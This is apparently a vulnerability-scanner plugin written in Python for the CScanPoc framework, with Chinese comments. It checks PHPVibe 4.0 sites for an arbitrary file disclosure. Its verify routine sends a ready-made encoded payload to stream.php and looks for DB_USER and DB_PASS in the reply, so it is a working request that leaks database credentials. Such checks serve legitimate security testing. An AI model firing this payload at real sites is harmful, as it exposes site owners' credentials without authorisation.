# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPVibe_0000'  # 平台漏洞编号，留空
    name = 'PHPVibe 4.0 Arbitrary File Disclosure'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-07-14'  # 漏洞公布时间
    desc = '''
        PHPVibe是国外一款视频CMS系统。
        PHPVibe /stream.php?file=TGk0dmRtbGlaVjlqYjI1bWFXY3VjR2h3UUVCdFpXUnBZUT09 任意文件泄露。
    '''  # 漏洞描述
    ref = 'https://packetstormsecurity.com/files/132691/phpvibe4-disclose.txt'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPVibe'  # 漏洞应用名称
    product_version = '4.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '608e54ac-96ba-4c9e-8c64-d77971a8d066'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/stream.php?file=TGk0dmRtbGlaVjlqYjI1bWFXY3VjR2h3UUVCdFpXUnBZUT09"
            r = requests.get(self.target + payload)

            if r.status_code == 200 and "DB_USER" in r.text and "DB_PASS" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
